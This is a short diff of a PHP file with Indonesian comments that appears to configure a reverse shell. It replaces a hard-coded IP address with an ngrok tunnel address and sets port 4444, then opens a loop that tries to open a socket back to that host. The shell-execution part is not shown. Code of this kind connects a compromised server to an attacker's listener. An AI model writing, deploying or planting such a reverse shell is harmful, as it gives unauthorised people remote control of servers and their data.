@@ -1,7 +1,7 @@
 <?php
 // Ganti IP dan PORT dengan milik Anda
-$ip = '140.213.158.142';
-$port = 4343;
+$ip = '0.tcp.ap.ngrok.io:10627';
+$port = 4444;
 
 while (true) {
     // Coba membuka socket
